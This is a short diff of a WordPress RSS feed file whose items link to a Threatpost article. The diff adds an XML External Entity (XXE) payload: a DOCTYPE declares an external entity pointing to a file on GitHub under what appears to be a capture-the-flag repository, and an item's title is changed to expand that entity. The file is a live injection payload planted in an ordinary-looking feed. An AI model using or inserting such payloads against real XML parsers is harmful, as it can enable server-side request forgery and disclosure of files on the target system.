@@ -1,4 +1,7 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE title [ <!ELEMENT title ANY >
+<!ENTITY xxe SYSTEM "https://raw.githubusercontent.com/b0DW/ctf/master/test.txt" >]>
+<rss version="2.0"
 	xmlns:content="http://purl.org/rss/1.0/modules/content/"
 	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
 	xmlns:dc="http://purl.org/dc/elements/1.1/"
@@ -20,7 +23,7 @@
 	1	</sy:updateFrequency>
 	<generator>https://wordpress.org/?v=5.2.4</generator>
 <atom:link rel="hub" href="https://pubsubhubbub.appspot.com"/><atom:link rel="hub" href="https://pubsubhubbub.superfeedr.com"/>	<item>
-		<title>123</title>
+		<title>&xxe;123</title>
 		<link>https://threatpost.com/katie-moussouris-the-bug-bounty-conflict-of-interest/152819/</link>
 				<comments>https://threatpost.com/katie-moussouris-the-bug-bounty-conflict-of-interest/152819/#respond</comments>
 				<pubDate>Wed, 12 Feb 2020 14:37:28 +0000</pubDate>
